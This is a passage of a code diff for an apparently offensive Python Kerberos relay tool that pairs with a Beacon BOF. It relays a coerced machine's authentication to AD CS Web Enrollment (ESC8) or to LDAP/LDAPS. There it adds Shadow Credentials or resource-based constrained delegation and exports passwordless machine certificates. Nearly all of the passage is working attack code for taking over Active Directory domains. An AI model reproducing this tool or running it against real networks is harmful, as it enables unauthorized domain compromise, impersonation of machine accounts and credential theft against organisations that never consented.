+                    raise RelayError("LDAP requested SASL continuation without serverSaslCreds")
+                continuation = ldap_rpc_continuation(response.server_credentials)
+                channel.send(MSG_SERVER_AUTH_TOKEN, continuation)
+                continue
+            if response.result_code != 0:
+                detail = f": {response.diagnostic}" if response.diagnostic else ""
+                raise RelayError(f"LDAP SASL bind failed with result {response.result_code}{detail}")
+            log("LDAP final bind succeeded; validating the queued directory write")
+            if pipelined_ids:
+                collect_pipelined_attack(ldap, pipelined_ids, log)
+                if pipeline_bundle:
+                    print(f"[+] Added Shadow Credential to {pipeline_target}", flush=True)
+                    channel.send(MSG_AUTH_OK)
+                    channel.bof_released = True
+                    return pipeline_bundle
+                print(
+                    f"[+] RBCD delegate added: {pipeline_rbcd.delegate} "
+                    f"({pipeline_rbcd.sid}) -> {pipeline_rbcd.target}",
+                    flush=True,
+                )
+                channel.send(MSG_AUTH_OK)
+                channel.bof_released = True
+                return pipeline_rbcd
+            raise RelayError("LDAP completed without the queued directory write")
+    finally:
+        ldap.close()
+
+
+def machine_schannel_context(bundle: CertificateBundle) -> ssl.SSLContext:
+    """Load an issued machine identity into TLS without retaining key files.
+
+    Python's OpenSSL binding accepts client keys only by filename. Linux memfd
+    paths satisfy that API while keeping both PEM values anonymous and
+    automatically destroying them as soon as the SSLContext has copied them.
+    """
+    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+    context.check_hostname = False
+    context.verify_mode = ssl.CERT_NONE
+    cert_fd = os.memfd_create("krbrelay-schannel-cert", os.MFD_CLOEXEC)
+    key_fd = os.memfd_create("krbrelay-schannel-key", os.MFD_CLOEXEC)
+    try:
+        os.write(cert_fd, bundle.certificate.public_bytes(serialization.Encoding.PEM))
+        os.write(key_fd, bundle.private_key.private_bytes(
+            serialization.Encoding.PEM,
+            serialization.PrivateFormat.PKCS8,
+            serialization.NoEncryption(),
+        ))
+        context.load_cert_chain(f"/proc/self/fd/{cert_fd}", f"/proc/self/fd/{key_fd}")
+    finally:
+        os.close(cert_fd)
+        os.close(key_fd)
+    return context
+
+
+def run_schannel_ldap(bundle: CertificateBundle, options: argparse.Namespace):
+    """Use the relayed machine certificate for a true LDAPS directory write.
+
+    The HTTP relay has already completed and the BOF has returned. AD maps the
+    client certificate during the TLS handshake, so no SASL integrity layer is
+    negotiated on top of LDAPS and ordinary RFC4511 requests are valid.
+    """
+    log = (lambda message: print(f"[*] {message}", flush=True)) if options.verbose else (lambda message: None)
+    if options.mode == "shadowcred":
+        requests, result, target = prepare_shadow_credential(options)
+    else:
+        requests, result = prepare_rbcd_pipeline(options)
+        target = result.target
+
+    log(
+        f"Opening LDAPS connection to {options.ldap_address}:{options.ldap_port} "
+        "with the relayed machine certificate"
+    )
+    ldap = RawLdapConnection(
+        options.ldap_address, options.ldap_port, options.ldap_host,
+        None, machine_schannel_context(bundle),
+    )
+    try:
+        # Query the authorization identity first so a certificate that failed
+        # AD's Schannel mapping cannot be mistaken for an authorized write.
+        operations = [(
+            0x77,
+            ber_tlv(0x80, b"1.3.6.1.4.1.4203.1.11.3"),
+        )] + requests
+        packet = bytearray()
+        ids = []
+        for operation_tag, body in operations:
+            ldap.message_id += 1
+            ids.append((ldap.message_id, operation_tag + 1))
+            packet.extend(ber_tlv(
+                0x30,
+                ber_integer(ldap.message_id) + ber_tlv(operation_tag, body),
+            ))
+        ldap.sock.sendall(packet)
+        identity = collect_pipelined_attack(ldap, ids, log)
+        expected_identity = (
+            f"u:{options.domain.split('.')[0]}\\{options.machine.rstrip('$')}$"
+        )
+        if identity.lower() != expected_identity.lower():
+            raise RelayError(
+                f"LDAPS mapped the certificate to unexpected identity {identity or '<empty>'}"
+            )
+        if options.mode == "shadowcred":
+            print(f"[+] Added Shadow Credential to {target} over LDAPS", flush=True)
+        else:
+            print(
+                f"[+] RBCD delegate added over LDAPS: {result.delegate} "
+                f"({result.sid}) -> {target}",
+                flush=True,
+            )
+        return result
+    finally:
+        ldap.close()
+
+
 # ---------------------------------------------------------------------------
 # CLI validation and listener lifecycle
 # ---------------------------------------------------------------------------
 def parse_args(argv: list[str]) -> argparse.Namespace:
-    """Declare operator-controlled endpoints while retaining safe web defaults."""
+    """Expose a separate, minimal CLI for each supported relay action."""
     parser = argparse.ArgumentParser()
-    parser.add_argument("--listen", default="127.0.0.1")
-    parser.add_argument("--port", type=int, required=True)
-    parser.add_argument("--allow", default="127.0.0.1")
-    parser.add_argument("--adcs-host", required=True, help="HTTP Host header and hostname used by the service SPN")
-    parser.add_argument("--adcs-address", required=True, help="IP address or resolvable hostname used for the TCP connection")
-    parser.add_argument("--adcs-port", type=int, default=80)
-    parser.add_argument("--auth-path", default="/certsrv/")
-    parser.add_argument("--enroll-path", default="/certsrv/certfnsh.asp")
-    parser.add_argument("--certificate-path", default="/certsrv/certnew.cer")
-    parser.add_argument("--domain", required=True)
-    parser.add_argument("--machine", required=True)
-    parser.add_argument("--template", required=True)
-    parser.add_argument("--quiet", action="store_false", dest="verbose")
-    parser.add_argument("--trace-spnego", action="store_true")
-    parser.add_argument("--export-pfx-b64", action="store_true")
-    parser.add_argument("--pfx-out", metavar="PATH")
-    parser.add_argument("--count", type=int, default=1, help="number of independent bridge sessions to accept")
-    return parser.parse_args(argv)
 
+    def add_common(target: argparse.ArgumentParser) -> None:
+        target.add_argument("--port", type=int, required=True, help="local KRB1/rport port")
+        target.add_argument("--domain", required=True)
+        target.add_argument("--machine", required=True, help="coerced machine name without trailing $")
+        target.add_argument("--quiet", action="store_false", dest="verbose")
+
+    def add_ldap(target: argparse.ArgumentParser) -> None:
+        add_common(target)
+        target.add_argument("--ldap-host", required=True, help="LDAP SPN hostname")
+        target.add_argument("--ldap-address", required=True, help="DC address reached through proxychains")
+        target.add_argument("--ldap-port", type=int, default=389)
+        target.add_argument("--target-dn", dest="ldap_target_dn", required=True, help="exact target computer DN")
+
+    actions = parser.add_subparsers(dest="action", required=True)
+    esc8 = actions.add_parser("esc8", help="relay to AD CS Web Enrollment")
+    add_common(esc8)
+    esc8.set_defaults(mode="adcs")
+    esc8.add_argument("--adcs-host", required=True, help="HTTP Host and service-SPN hostname")
+    esc8.add_argument("--adcs-address", required=True, help="CA address reached through proxychains")
+    esc8.add_argument("--adcs-port", type=int)
+    esc8.add_argument("--adcs-tls", action="store_true", help="use HTTPS Web Enrollment")
+    esc8.add_argument("--auth-path", default="/certsrv/")
+    esc8.add_argument("--enroll-path", default="/certsrv/certfnsh.asp")
+    esc8.add_argument("--certificate-path", default="/certsrv/certnew.cer")
+    esc8.add_argument("--template", required=True)
+    esc8.add_argument("--pfx-out", metavar="PATH")
+    esc8.add_argument("--export-pfx-b64", action="store_true")
+
+    shadowcred = actions.add_parser("shadowcred", help="add a Shadow Credential")
+    add_ldap(shadowcred)
+    shadowcred.set_defaults(mode="shadowcred")
+    shadowcred.add_argument("--pfx-out", metavar="PATH")
+    shadowcred.add_argument("--export-pfx-b64", action="store_true")
+
+    rbcd = actions.add_parser("rbcd", help="grant resource-based constrained delegation")
+    add_ldap(rbcd)
+    rbcd.set_defaults(mode="rbcd")
+    rbcd.add_argument("--delegate-account", help="controlled SPN account label")
+    rbcd.add_argument("--delegate-sid", required=True, help="controlled SPN account SID")
+    return parser.parse_args(argv)
 
 def pfx_output_path(bundle: CertificateBundle, options: argparse.Namespace) -> Optional[str]:
     """Resolve a collision-free proof path, including request-ID templates."""
@@ -700,82 +1379,115 @@ def pfx_output_path(bundle: CertificateBundle, options: argparse.Namespace) -> O
         configured = configured.format(request_id=bundle.request_id)
     except (KeyError, ValueError) as exc:
         raise RelayError(f"invalid --pfx-out template: {exc}") from exc
-    if getattr(options, "count", 1) > 1 and "{request_id}" not in (options.pfx_out or ""):
-        stem, extension = os.path.splitext(configured)
-        configured = f"{stem}-{bundle.request_id}{extension}"
     return os.path.abspath(configured)
 
 
 def publish_bundle(bundle: CertificateBundle, options: argparse.Namespace) -> None:
     """Serialize one verified enrollment without overwriting multi-run proofs."""
+    identity = options.machine
+    label = "Machine certificate"
+    if options.mode == "shadowcred":
+        identity = f"{options.machine.rstrip('$')}$"
+        label = "Shadow Credential"
     pfx_path = pfx_output_path(bundle, options)
     if not (options.export_pfx_b64 or pfx_path):
-        print(f"[+] Machine certificate acquired and key pair verified (request {bundle.request_id})", flush=True)
+        print(f"[+] {label} key pair acquired ({bundle.request_id})", flush=True)
         return
-    pfx = serialize_pfx(bundle, options.machine)
+    pfx = serialize_pfx(bundle, identity)
     if pfx_path:
-        create_mode = os.O_EXCL if getattr(options, "count", 1) > 1 else os.O_TRUNC
-        descriptor = os.open(pfx_path, os.O_WRONLY | os.O_CREAT | create_mode, 0o600)
+        descriptor = os.open(pfx_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
         with os.fdopen(descriptor, "wb") as output:
             output.write(pfx)
-        print(f"[+] Saved passwordless machine PKCS#12 to {pfx_path}", flush=True)
+        print(f"[+] Saved passwordless {label.lower()} PKCS#12 to {pfx_path}", flush=True)
     if options.export_pfx_b64:
         # An export needs a reconstruction destination even if no local save
         # was requested. pfx_output_path supplies that default above.
         print_pfx(pfx, options, pfx_path or os.path.abspath(f"{options.machine}-machine.pfx"))
-    print(f"[+] Machine certificate acquired and key pair verified (request {bundle.request_id})", flush=True)
+    if options.mode == "adcs":
+        print(f"[+] Machine certificate acquired and key pair verified (request {bundle.request_id})", flush=True)
+    else:
+        print(f"[+] Shadow Credential DeviceId: {bundle.device_id}", flush=True)
+        print(f"[+] Shadow Credential KeyId: {bundle.key_id}", flush=True)
+        print(f"[+] Shadow Credential key pair acquired ({bundle.request_id})", flush=True)
 
 
 def main(argv: list[str]) -> int:
-    """Accept the requested number of independent authorized bridge peers."""
+    """Accept one authorized bridge and complete the selected action."""
     options = parse_args(argv)
-    for name in ("auth_path", "enroll_path", "certificate_path"):
-        if not getattr(options, name).startswith("/"):
-            raise SystemExit(f"--{name.replace('_', '-')} must be an absolute HTTP path")
-    if any(not 1 <= value <= 65535 for value in (options.port, options.adcs_port)):
+    if options.mode == "adcs":
+        if options.adcs_port is None:
+            options.adcs_port = 443 if options.adcs_tls else 80
+        for path in ("auth_path", "enroll_path", "certificate_path"):
+            if not getattr(options, path).startswith("/"):
+                raise SystemExit(f"--{path.replace('_', '-')} must be an absolute path")
+        ports = [options.port, options.adcs_port]
+    else:
+        if options.mode == "shadowcred" and not (options.pfx_out or options.export_pfx_b64):
+            raise SystemExit("shadowcred mode requires --pfx-out or --export-pfx-b64")
+        ports = [options.port, options.ldap_port]
+    if any(not 1 <= value <= 65535 for value in ports):
         raise SystemExit("TCP ports must be between 1 and 65535")
-    if options.count < 1:
-        raise SystemExit("--count must be at least 1")
-    # Resolve the allow value before listening. The common rportfwd_local path
-    # appears as 127.0.0.1 regardless of the original target network address.
-    allowed_addresses = {
-        item[4][0] for item in socket.getaddrinfo(options.allow, None, socket.AF_INET, socket.SOCK_STREAM)
-    }
-    service_spn = f"http/{options.adcs_host}"
+    # KRB1 is reachable only through the target's rportfwd_local transport.
+    # Binding and authorizing loopback internally prevents network exposure.
+    bridge_address = "127.0.0.1"
+    service_spn = f"http/{options.adcs_host}" if options.mode == "adcs" else f"ldap/{options.ldap_host}"
     print(
         f"[*] Matching Beacon command: krbrelay {options.port} "
-        f"{service_spn} <RPC_ENDPOINT>",
-        flush=True,
+        f"{service_spn} <RPC_ENDPOINT>", flush=True,
     )
+
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        listener.bind((options.listen, options.port))
+        listener.bind((bridge_address, options.port))
         listener.listen(1)
-        print(f"[*] Awaiting {options.machine} relay on {options.listen}:{options.port}", flush=True)
+        print(f"[*] Awaiting {options.machine} relay on {bridge_address}:{options.port}", flush=True)
         failed = False
-        for session_number in range(1, options.count + 1):
-            client, peer = listener.accept()
-            with client:
-                channel = RecordChannel(client)
-                if peer[0] not in allowed_addresses:
-                    print("[-] Rejected unauthorized bridge peer", flush=True)
-                    failed = True
-                    continue
-                if options.verbose:
-                    print(
-                        f"[+] Accepted authorized bridge connection {session_number}/{options.count} "
-                        f"from {peer[0]}", flush=True,
+        probe, peer = listener.accept()
+        with probe:
+            channel = RecordChannel(probe)
+            if peer[0] != bridge_address:
+                print("[-] Rejected unauthorized bridge peer", flush=True)
+                return 1
+            try:
+                # Keep preflight separate from the token stream. The BOF
+                # closes this socket and opens a fresh one during SSPI.
+                channel.receive({MSG_BRIDGE_PREFLIGHT})
+                channel.send(MSG_BRIDGE_READY)
+            except (RelayError, OSError) as exc:
+                print(f"[-] Relay bridge preflight failed: {exc}", flush=True)
+                return 1
+        if options.verbose:
+            print("[+] Validated client-local relay bridge", flush=True)
+
+        client, peer = listener.accept()
+        with client:
+            channel = RecordChannel(client)
+            if peer[0] != bridge_address:
+                print("[-] Rejected unauthorized bridge peer", flush=True)
+                return 1
+            if options.verbose:
+                print(f"[+] Accepted authorized bridge connection from {peer[0]}", flush=True)
+            try:
+                    outcome = (
+                        run_session(channel, options)
+                        if options.mode == "adcs" else run_ldap_session(channel, options)
                     )
-                try:
-                    publish_bundle(run_session(channel, options), options)
-                except (RelayError, OSError, ValueError, TypeError) as exc:
-                    if not channel.bof_released:
-                        try:
-                            channel.send(MSG_ERROR, str(exc).encode("utf-8")[:MAX_ERROR])
-                        except (OSError, RelayError):
-                            pass
-                    print(f"[-] Relay failed: {exc}", flush=True)
-                    failed = True
+                    if options.mode != "rbcd":
+                        publish_bundle(outcome, options)
+                    print(
+                        "[+] " + ("RBCD" if options.mode == "rbcd" else
+                                   "Shadow Credentials" if options.mode == "shadowcred" else
+                                   "AD CS") + " relay completed",
+                        flush=True,
+                    )
+            except (RelayError, OSError, ValueError, TypeError) as exc:
+                if not channel.bof_released:
+                    try:
+                        channel.send(MSG_ERROR, str(exc).encode("utf-8")[:MAX_ERROR])
+                    except (OSError, RelayError):
+                        pass
+                print(f"[-] Relay failed: {exc}", flush=True)
+                failed = True
         return 1 if failed else 0
 
 
